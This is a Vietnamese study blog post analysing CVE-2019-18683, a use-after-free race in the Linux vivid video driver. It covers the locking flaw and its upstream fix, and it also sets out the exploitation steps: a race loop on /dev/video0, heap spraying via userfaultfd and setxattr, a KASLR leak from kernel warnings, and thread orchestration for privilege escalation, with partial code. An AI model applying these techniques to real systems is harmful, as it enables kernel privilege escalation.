vivid_fop_release --&gt; vb2_fop_release
vb2_fop_release --&gt; vb2_queue_release
vb2_queue_release --&gt; vb2_core_queue_release
vb2_core_queue_release --&gt; __vb2_cleanup_fileio
__vb2_cleanup_fileio --&gt; vb2_core_streamoff
vb2_core_streamoff --&gt; __vb2_queue_cancel
__vb2_queue_cancel --&gt; vivid_stop_generating_vid_cap
__vb2_cleanup_fileio --&gt; vb2_core_reqbufs
vb2_core_reqbufs --&gt; __vb2_queue_free

</code></pre><p>Nhìn vào lược đồ trên, ta thấy khá đơn giản, tuy nhiên có một chú ý:</p>
<ul>
<li>Hàm <code>vivid_stop_generating_vid_cap</code> trả khóa, rồi gọi <code>kthread_stop</code> để dừng kernel thread đang thực hiện hàm <code>vivid_thread_vid_cap</code>.<br />
Nếu như kết thúc hàm <code>read()</code> nó chỉ tạo ra một nguy cơ xảy ra lỗi <code>uaf</code>, thì tại đây chính là nguyên nhân gây ra lỗi <code>uaf</code>.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">	<span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
    <span class="n">kthread_stop</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span><span class="p">);</span>
    <span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>Sau khi <code>vivid_stop_generating_vid_cap</code> thực hiện xong, nó sẽ gọi hàm <code>__vb2_queue_free</code> để giải phóng <code>vb2_queue-&gt;bufs</code> và <code>vb2_buffer</code>, ròi đóng process hiện tại. Đừng quên rằng, <code>vb2_buffer</code> ngay lúc này đang được 1 process khác đưa vào hàng đợi <code>vid_cap_active</code> để chuẩn bị thực thi. Điều này dẫn tới lỗi UAF</p>
<h2 id="bugs-and-fixes">Bugs and Fixes</h2>
<ul>
<li>Tác giả sử dụng <code>skyzkaller fuzzer</code> với những tùy chỉnh trong kernel source code và thấy những crash trong kernel. <code>KASAN</code> phát hiện ra lỗi <code>use-after-free</code> trong các thao tác danh sách liên kết trong <code>vid_cap_buf_queue()</code>. Nguyên nhân là do sự sai sót trong quá trình sử dụng khóa (mutex lock) trong <code>vivid_stop_generating_vid_cap(), vivid_stop_generating_vid_out() và sdr_cap_stop_streaming()</code>.</li>
<li>Những hàm trên được gọi khi bị khóa <code>vivid_dev.mutex</code>, quá trình streaming bị dừng. Chúng cùng mắc phải một lỗi là khi muốn dừng kthreads thì nó cũng cần phải khóa mutex này. Ví dụ, trong hàm <code>vivid_stop_generating_vid_cap()</code>:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">	<span class="cm">/* shutdown control thread */</span>
	<span class="n">vivid_grab_controls</span><span class="p">(</span><span class="n">dev</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
	<span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
	<span class="n">kthread_stop</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span><span class="p">);</span>
	<span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Tuy nhiên, khi mutex được unlocked, một hàm khác <code>vb2_fop_read()</code> có thể khóa nó thay vì <code>kthread</code> và thao tác trên hàng đợi (<code>buffer queue</code>). Điều này dẫn tới khả năng xảy ra <code>use-after-free</code> sau này khi streaming hoạt động trở lại.<br />
<div class="notices warning" data-title="Warning">
  <em>chưa biết cách sử dụng <code>skyzkaller fuzzer</code></em>.<br />
<del>Vì sao dẫn tới khả năng xảy ra <code>use-after-free</code>?</del> (đã trả lời trong cơ chế hàm <code>read, close</code> trong vivid)
</div></li>
<li>Để giải quyết tình trạng trên, tác giả đề xuất như sau:</li>
</ul>
<ol>
<li>Không mở khóa mutex khi stream dừng. Ví dụ ở hàm <code>vivid_stop_generating_vid_cap()</code> chúng ta sẽ bỏ 2 hàm:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="hl"><span class="lnt">3
</span></span><span class="lnt">4
</span><span class="lnt">5
</span><span class="hl"><span class="lnt">6
</span></span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-diff" data-lang="diff">	/* shutdown control thread */
	vivid_grab_controls(dev, false);
<span class="hl"><span class="gd">-	mutex_unlock(&amp;dev-&gt;mutex);
</span></span><span class="gd"></span>	kthread_stop(dev-&gt;kthread_vid_cap);
	dev-&gt;kthread_vid_cap = NULL;
<span class="hl"><span class="gd">-	mutex_lock(&amp;dev-&gt;mutex); 
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>Sử dụng <code>mutex_trylock()</code> với <code>schedule_timeout_uninterruptible()</code> trong vòng lặp của vivid kthread handler. Hàm xử lí <code>vivid_thread_vid_cap()</code> được thay đổi như sau:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="hl"><span class="lnt"> 5
</span></span><span class="hl"><span class="lnt"> 6
</span></span><span class="hl"><span class="lnt"> 7
</span></span><span class="hl"><span class="lnt"> 8
</span></span><span class="hl"><span class="lnt"> 9
</span></span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-diff" data-lang="diff">  	for (;;) {
  		try_to_freeze();
  		if (kthread_should_stop())
  			break;
<span class="hl"><span class="gd">-		mutex_lock(&amp;dev-&gt;mutex);
</span></span><span class="hl"><span class="gd"></span><span class="gi">+		if (!mutex_trylock(&amp;dev-&gt;mutex)) {
</span></span><span class="hl"><span class="gi">+			schedule_timeout_uninterruptible(1);
</span></span><span class="hl"><span class="gi">+			continue;
</span></span><span class="hl"><span class="gi">+		}
</span></span><span class="gi"></span>  		...
  	}
</code></pre></td></tr></table>
</div>
</div><p>Nếu mutex này không hoạt động, kthread sẽ ngủ trong giây lát rồi thử lại. Trong trường hợp xấu nhất, kthread sẽ ngủ vài lần và chạm đến <code>break</code> để thoát khỏi vòng lặp hiện tại.</p>
<h2 id="winning-the-race">Winning the race</h2>
<ul>
<li>Chúng ta đã hiểu tại sao lại <code>vivid</code> lại có thể dẫn tới lỗi <code>UAF</code>, bây giờ chúng ta sẽ tiến hành khai thác lỗi này.</li>
<li>Để test kernel, chúng ta cần đảm bảo:
<ul>
<li>Đã có <code>vivid driver</code></li>
<li>/dev/video0 is the V4L2 capture device</li>
<li>Chúng ta đã login</li>
</ul>
</li>
</ul>
<ol>
<li>Chúng ta tạo 2 pthreads. Trường hợp này, bắt buộc sử dụng <a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html"><code>ched_setaffinity</code></a> để racing tốt hơn.</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">	<span class="n">cpu_set_t</span> <span class="n">single_cpu</span><span class="p">;</span>

	<span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
	<span class="n">CPU_SET</span><span class="p">(</span><span class="n">cpu_n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">sched_setaffinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">single_cpu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] sched_setaffinity for a single CPU&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>Chúng ta tiến hành race</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">	<span class="k">for</span> <span class="p">(</span><span class="n">loop</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">loop</span> <span class="o">&lt;</span> <span class="n">LOOP_N</span><span class="p">;</span> <span class="n">loop</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/video0&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
			<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] open /dev/video0&#34;</span><span class="p">);</span>

		<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xfffded</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Khai bắt đầu streaming hàm <code>vid_cap_start_streaming()</code> sẽ , được gọi bởi <code>V4L2</code> trong khi <code>vb2_core_streamon()</code> đọc từ file descriptor.</li>
<li>Khi dừng streaming, hàm <code>vivid_stop_generating_vid_cap()</code> sẽ được <code>V4L2</code> gọi trong khi <code>__vb2_queue_cancel()</code> sẽ giải phóng tham khảo cuối cùng đến file.</li>
<li>Do đó, nếu một trình đọc khác &ldquo;chiến thắng&rdquo; kthreads, nó sẽ gọi <code>vb2_core_qbuf()</code>, hàm này sẽ thêm <code>vb2_buffer</code> vào <code>vb2_queue.queued_list</code>.</li>
<li>Khi chạy đoạn code trên, chúng ta có thể sẽ được kết quả như sau:<br />
<img src="/images/posts/CVE-2019-18683/poc_crash.jpg" alt="poc_crash.jpg" /></li>
<li>Ta có 2 thread chạy trên 2 CPU khác nhau, màu đỏ đại diện thread A, màu xanh đại diện thread B</li>
</ul>
<table>
<thead>
<tr>
<th>Thread A</th>
<th>Thread B</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chạy <code>vb2_core_dqbuf</code>, trả khóa (giả sử <code>vivid_thread_vid_cap</code> đã có khóa)</td>
<td></td>
</tr>
<tr>
<td></td>
<td><code>vb2_fop_read</code> lấy được khóa, thực hiện và có vẻ không thỏa mãn điều kiện nào đó nên dừng, trả khóa lại</td>
</tr>
<tr>
<td><code>vivid_thread_vid_cap</code> nhận được khóa, giải phóng buffer</td>
<td></td>
</tr>
<tr>
<td></td>
<td>thực hiện hàm <code>close(fd)</code>, gọi hàm <code>vivid_stop_genrating_vid_cap</code> để xóa hàng đợi <code>vid_cap_active</code> ra khỏi thiết bị, trả khóa (hi vọng <code>vivid_thread_vid_cap</code> sẽ lấy được khóa này)</td>
</tr>
<tr>
<td><code>vb_core_dqbuf</code> lấy được khóa, gọi <code>__enqueue_in_driver</code> để thêm <code>vb2_buffer</code> vào hàng đợi. Thực hiện lệnh read và giải phóng khóa</td>
<td></td>
</tr>
<tr>
<td></td>
<td><code>vivid_stop_generating_vid_cap</code> nhận được khóa và thực hiện lệnh <code>close(fd)</code> để đóng process và giải phóng vùng nhớ <code>vb2_buffer</code>, vùng nhớ này vẫn còn nằm trong hàng đợi <code>vid_cap_active</code>, và có thể được dùng cho lần đọc tiếp teho -&gt; lỗi <code>UAF</code></td>
</tr>
<tr>
<td></td>
<td>Bước vào vòng lặp mới, đợi có khóa để gọi <code>vivid_thread_vid_cap</code> để đưa vùng nhớ <code>vb2_buffer</code> cũ vừa bị kfree vào <code>vivid_fillbuff</code> vì vùng nhớ bị kfree nên sẽ bị xóa đi những trường cần thiết cho quá trình thực hiện, nên sau đó chương trình sẽ bị crash</td>
</tr>
</tbody>
</table>
<h2 id="deceived-v4l2-sub-system">Deceived V4L2 sub system</h2>
<ul>
<li>Khi streaming dừng hẳn, tham khảo cuối cùng tới <code>/dev/video0</code> được giải phóng, <code>V4L2 subsystem calls</code> sẽ gọi <code>vb2_core_queue_release()</code> để giải phóng tài nguyên. Hệ thống sẽ lần lượt gọi <code>__vb2_queue_free()</code> để giải phóng <code>vb2_buffer</code> - đã được thêm vào hàng đợi khi mà exploit cảu chúng ta thắng race.<br />
Tuy nhiên, driver không biết điều đó và vẫn giữ tham khảo đến một object đã được giải phóng. Khi stream bắt đầu lại, nó sẽ nhảy vào exploit loop, <code>vivid</code> driver sẽ chạm đến đối tượng bị giải phóng và điều này đã được <code>KASAN</code> phát hiện.</li>
</ul>
<h2 id="heap-spraying">Heap spraying</h2>
<ul>
<li><code>Heap spraying</code> là kĩ thuật, mục đích đặt những <code>controlled bytes</code> vào những vị trí có thể xác định trước trên heap. Kĩ thuật này thường liên quan tới việc cấp phát nhiều đối tượng trên heap với <code>controlled contents</code> và làm sao để một số <code>allocator</code> để cấp phát ngay vùng nhớ trên.</li>
<li><code>Heap spraying</code> sử dụng để khai thác <code>use-after-free</code> trong Linux Kernel sẽ thường dùng <code>kmalloc()</code> vì hàm này sẽ trả về địa chỉ của vùng nhớ vừa được free. Do đó, nếu cấp phát một đối tượng, cùng địa chỉ với <code>controlled contents</code> sẽ cho phép chúng ta ghi đè vùng nhớ có thể khai thác.<br />
<img src="/images/posts/CVE-2019-18683/uaf.png" alt="uaf" /><br />
<em>Ảnh tham khảo từ: <a href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html</a></em></li>
<li>Kĩ thuật này có thể được triển khai bằng cách sử dụng kết hợp <code>userfaultfd()</code> + <code>setxattr()</code> với ý tưởng chính rằng <code>userfaultfd()</code> sẽ cho phép chúng ta kiểm soát được <code>lifetime</code> của dữ liệu được cấp phát bởi <code>setxattr()</code> trong kernelspace.</li>
<li>Quay trở về với lỗ hổng này, <code>vb2_buffer</code> sẽ được <code>free</code> khi streaming dừng và sẽ được <code>use</code> ở lần streaming tiếp theo. Do đó, nếu chúng ta sử dụng kĩ thuật <code>heap spraying</code> vào cuối vòng lặp thứ nhất trước khi streaming stop thì khi streaming bắt đầu ở vòng lặp kế tiếp thì chúng ta có thể dùng <code>kmalloc()</code> để cấp phát vùng nhớ vừa free ở cuối vòng lặp trước với <code>controlled data</code>.</li>
<li>Tuy nhiên, lúc bấy giờ, tác giả phát hiện ra một vấn đề: vùng nhớ <code>vb2_buffer</code> không phải là vùng nhớ cuối cùng được giải phóng bởi <code>__vb2_queue_free()</code>, do đó, ở vòng lặp tiếp theo, khi gọi <code>kmalloc)</code> thì nó sẽ không trả về đúng địa chỉ mà chúng ta cần. Vì thế, chúng ta cần phải allocate nhiều lần để có thể cấp phát đúng được vị trí mong muốn.</li>
<li>Nhưng muốn áp dụng điều trên với hai hàm <code>userfaultfd()</code> + <code>setxattr()</code> là không dễ dàng vì: dữ liệu do <code>setxattr()</code> cấp phát chỉ tồn tại cho đến khi trình xử lí lỗi trang <code>userfaultfd()</code> gọi hàm <code>ioctl</code> với flag <code>UFFDIO_COPY</code>. Hay nói cách khác, muốn dữ liệu được cấp phát bởi <code>setxattr()</code> không bị mất thì <code>userfaultfd()</code> không gọi <code>ioctl</code>. Tác giả giải quyết vấn đề này bằng cách tạo ra một <code>pool of threads</code>: mỗi thread này được gọi là <code>spraying thread</code>, gọi hàm <code>setxattr()</code> được xử lí bởi <code>userfaultfd()</code> và lưu dữ liệu được cấp phát.</li>
</ul>
<p><div class="notices warning" data-title="Warning">
  <del><em>Tôi vẫn chưa biết tât cả các spraying thread đều được xử lí bởi <code>userfaultfd()</code> hay mỗi spraying thread sẽ có 1 <code>userfaultfd()</code> tương ứng</em></del> (sẽ được giải thích ở những mục dưới)
</div><br />
<em>Bây giờ, chúng ta sẽ viết payload gì vào <code>vb2_buffer</code>?</em></p>
<h2 id="control-flow-hijack-for-v4l2-subsystem">Control flow hijack for V4L2 subsystem</h2>
<p>Lược đồ dưới đây đặc tả sơ lược mối quan hệ giữa các object trong <code>V4L2 subsystem</code><br />
<img src="/images/posts/CVE-2019-18683/v4l2_objects.png" alt="v4l2_objects.png" /><br />
Tại đây thì tác giả bảo ông ấy tốn khá nhiều thời gian để tìm cách ghi nội dung tùy ý vào <code>vb2_buffer</code> và bằng một cách thần kỳ nào đó, ông ta đã tìm ra con đường như trên lược đồ:<br />
<code>vb2_buffer.vb2_queue-&gt;mem_ops-&gt;vaddr</code><br />
Dễ thấy, hàm <code>vaddr()</code> nhận <code>vb2_buffer.planes[0].mem_priv</code> làm tham số.</p>
<h3 id="unexpected-troubles-kthread-context">Unexpected troubles: kthread context</h3>
<ul>
<li>Chúng ta bắt đầu viết những payload để <code>V4L2</code> chạm tới con trỏ hàm này.</li>
</ul>
<ol>
<li>Tắt <code>SMAP (Supervisor Mode Access Prevention), SMEP (Supervisor Mode Execution Prevention), KPTI (Kernel Page-Table Isolation)</code></li>
<li>Làm <code>vb2_buffer.vb2_queue</code> trỏ tới một vùng nhớ được ánh xạ trên userspace.</li>
<li>Deferencing con trỏ này sẽ cho lỗi <code>&quot;unable to handle page fault&quot;</code>.<br />
Lí do trả về lỗi vì con trỏ mà chúng ta muốn deferencing đang ở <code>kernel thread context</code>, nơi mà userspace không thể ánh xạ tới. Do đó, vấn đề lúc bây giờ, làm sao đặt <code>vb2_queue</code> và <code>vb2_mem_ops</code> tại những vùng nhớ mà biết được địa chỉ, và có thể truy cập từ <code>kthread context</code>.</li>
</ol>
<ul>
<li>Trong hàm <code>__vb2_queue_cancel()</code> cho phép chúng ta gửi những cảnh báo (warning), điều đó có nghĩa chúng ta có thể phân tích cú pháp của <code>kernel warning information</code> (có thể thực hiện trên các ubuntu server). Điều này cho phép chúng ta đưa payload vào <code>kernel stack</code>và giữ nó bằng <code>userfaultfd()</code>, giống như kĩ thuật heap spraying sử dụng <code>userfaultfd()</code> + <code>setxattr()</code>. Hàm <code>copy_from_user()</code>  sẽ giúp ta đưa dữ liệu vào kernel stack.</li>
<li>Chúng ta sẽ phân tích cú pháp của <code>warning</code> để lấy địa chỉ của kernel stack và dự đoán dự đoán địa chỉ của payload.</li>
</ul>
<h2 id="exploit-orchestra">Exploit Orchestra</h2>
<ol>
<li>Tạo ra <code>pool of threads</code> và đồng bộ hóa chúng bằng hàm <code>pthread_barriers</code>. Dưới đây là code <code>pthread_barriers</code>được đặt tại các con trỏ tham khảo chính trong suốt quá trình khai thác</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec"><span class="cp">#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)
</span><span class="cp"></span>
<span class="cp">#define THREADS_N 50
</span><span class="cp"></span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_prepare</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_race</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_parse</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_kstack</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_spray</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_fatality</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_prepare</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">THREADS_N</span> <span class="o">-</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] pthread_barrier_init&#34;</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_race</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] pthread_barrier_init&#34;</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_parse</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] pthread_barrier_init&#34;</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_kstack</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] pthread_barrier_init&#34;</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_spray</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">THREADS_N</span> <span class="o">-</span> <span class="mi">5</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] pthread_barrier_init&#34;</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_fatality</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] pthread_barrier_init&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Mỗi thread có một vai trò riêng. Trong trường hợp này, ta dùng 50 thread với 5 vai trò khác nhau:
<ul>
<li><strong>2</strong> <code>racer threads</code></li>
<li><strong>(THREADS_N - 6) = 44</strong> <code>sprayer pthreads</code>, những thread này sẽ giữ <code>setxattr()</code> được xử lí bởi <code>userfaultfd()</code></li>
<li><strong>2</strong> pthread cho <code>userfaulfd()</code> xử lí page fault. Đến đây tôi đã giải đáp được thắc mắc ở trên, 2 thread cho userfaultfd() xử lí cho 44 sprayer pthreads.</li>
<li><strong>1</strong> pthread cho phân tích <code>/dev/kmsg</code> và xử lí payload</li>
<li><strong>1</strong> <code>fatility pthread</code> chịu trách nhiệm kích hoạt leo thang đăc quyền - <code>privilege escalation</code>.</li>
</ul>
</li>
</ul>
<div class="notices warning" data-title="Warning">
  <em>Những con số này từ đâu mà ra hay chỉ chọn random?</em>
</div>
<ul>
<li>Những thread với những vai trò khác nhau sẽ được đồng bộ hóa tại các <code>pthread_barries</code> khác nhau. Tham số cuối cùng của <code>pthread_barrier_init()</code> chỉ định số thread <code>PHẢI</code> gọi <code>pthread_barrier_wait()</code> cho từng barrier cụ thể trước khi nó tiếp tục giao tiếp với nhau.</li>
<li>Bảng sau sẽ mô tả chi tiết tất cả các pthread với vai trò khai thác của nó, đồng bộ hóa qua <code>pthread_barrier_wait()</code>. barrier được liệt kê theo trình tự thời gian thực hiện. Bảng này nên được đọc theo từng dòng và đừng quên, các pthread đang thực hiện song song.</li>
</ul>
<table>
<thead>
<tr>
<th>pthreads</th>
<th>2 racers</th>
<th>44 sprayers</th>
<th>page fault hander #1</th>
<th>page fault hander #2</th>
<th>kmsg parser</th>
<th>fatality</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. <strong>barrier_prepare</strong> <br> (for 47 pthreads)</td>
<td>wait on barrier</td>
<td>1. create files in tmpfs for doing <code>setxattr()</code> later <br> 2. wait on barrier</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>1. open <code>/dev/kmsg</code> <br> 2. wait on barrier</td>
<td>&mdash;</td>
</tr>
<tr>
<td>2. <strong>barrier_race</strong> <br> (for 2 pthreads)</td>
<td>1. <code>usleep()</code> to let other pthread go to their next barrier <br> 2. wait on barrier <br> 3. race</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>&mdash;</td>
</tr>
<tr>
<td>3. <strong>barrier_parse</strong> <br> (for 3 pthreads)</td>
<td>wait on barrier</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>1. wait on barrier <br> 2. parse the kernel warning to extract <code>RSP</code> and <code>R11</code> (contains a pointer to code) <br> 3. Calculate the address of the kernel stack top and the <code>KASLR</code> offset. <br> adapt the pointers in the payloads for kernel heap and stack.</td>
<td>&mdash;</td>
</tr>
<tr>
<td>4. <strong>barrier_kstack</strong> <br> (for 3 pthreads)</td>
<td>1. wait on barrier <br> 2. place the kernel stack payload via <code>adjtimex()</code> and hang</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>wait on barrier</td>
<td>&mdash;</td>
</tr>
<tr>
<td>5. <strong>barrier_spray</strong> <br> (for 45 pthreads)</td>
<td>&mdash;</td>
<td>1. wait on barrier <br> 2. place the kernel heap payload via <code>setxattr()</code> and hang</td>
<td>&mdash;</td>
<td>1. catch 2 page faults from <code>adjtimex()</code> called by racers. <br> 2. wait on barrier</td>
<td>&mdash;</td>
<td>&mdash;</td>
</tr>
<tr>
<td>6. <strong>barrier_fatality</strong> <br> (for 2 pthreads)</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>1. catch 44 page faults from <code>setxattr()</code> called by sprayers <br> 2. wait on barrier</td>
<td>&mdash;</td>
<td>&mdash;</td>
<td>1. wait on barrier <br> 2. trigger the payload for privilege escalation <br> 3. the end!</td>
</tr>
</tbody>
</table>
<div class="notices warning" data-title="Warning">
  <em>Chưa nắm vững / hiểu rõ các pthread được liệt kê trong bảng trên</em>
</div>
<ul>
<li>Vấn đề đặt ra với tôi bây giờ là làm sao để điều khiển các thread giống như table trên. Quay lại môn OS và nhận ra mình chả nhớ gì cả == hậu quả của việc học vẹc. Bây giờ bắt đầu học về nó&hellip;<br />
